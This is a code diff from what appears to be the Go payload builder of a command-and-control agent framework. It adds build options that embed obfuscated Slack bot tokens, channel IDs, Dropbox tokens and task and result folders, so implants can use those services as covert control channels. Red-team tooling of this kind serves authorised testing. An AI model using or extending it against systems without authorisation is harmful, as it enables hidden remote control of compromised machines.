@@ -641,9 +641,41 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 				if cryptoVal, err := payloadBuildMsg.C2Profiles[0].GetCryptoArg(key); err == nil {
 					obfVars = append(obfVars, obfVar{"encryptionKey", cryptoVal.EncKey})
 				}
+			case "slack_bot_token":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"slackBotToken", val})
+				}
+			case "slack_channel_id":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"slackChannelID", val})
+				}
+			case "slack_poll_interval":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"slackPollInterval", fmt.Sprintf("%d", int(val))})
+				}
+			case "dropbox_token":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"dropboxToken", val})
+				}
+			case "dropbox_task_folder":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"dropboxTaskFolder", val})
+				}
+			case "dropbox_result_folder":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"dropboxResultFolder", val})
+				}
+			case "dropbox_archive_folder":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"dropboxArchiveFolder", val})
+				}
+			case "dropbox_poll_interval":
+				if val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key); err == nil {
+					obfVars = append(obfVars, obfVar{"dropboxPollInterval", fmt.Sprintf("%d", int(val))})
+				}
 			}
 		}
-		// Also encode payloadUUID, hostHeader, proxyURL, customHeaders
+		// Also encode payloadUUID, hostHeader, proxyURL, customHeaders, and fallback hosts.
 		obfVars = append(obfVars, obfVar{"payloadUUID", payloadBuildMsg.PayloadUUID})
 		if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
 			obfVars = append(obfVars, obfVar{"hostHeader", hostHeader})
